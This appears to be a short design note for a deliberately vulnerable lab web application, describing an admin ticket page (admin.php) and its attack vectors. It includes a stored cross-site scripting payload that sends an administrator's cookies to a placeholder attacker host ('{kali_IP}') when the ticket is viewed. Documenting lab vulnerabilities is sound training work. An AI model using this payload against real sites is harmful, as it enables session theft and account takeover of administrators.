>[!info] Introduction
>This web page is served under/var/www/html/admin.php

>The sole purpose of admin.php is for the privilege user (administrators role) to accept/release/close any tickets within the [[EDR Design (MariaDB)|ticketing table]].

> [!danger] Attack Vectors

 Cross Site Scripting (Stored): 
 `<script>new Image().src="{kali_IP}"+document.cookie</script>` is the payload which would be inserted into the ticket comment/description. Once the administrator clicks on the ticket, the XSS would be executed. 

>[!warning] Misconfigurations

Refer to [[create_ticket.php]]
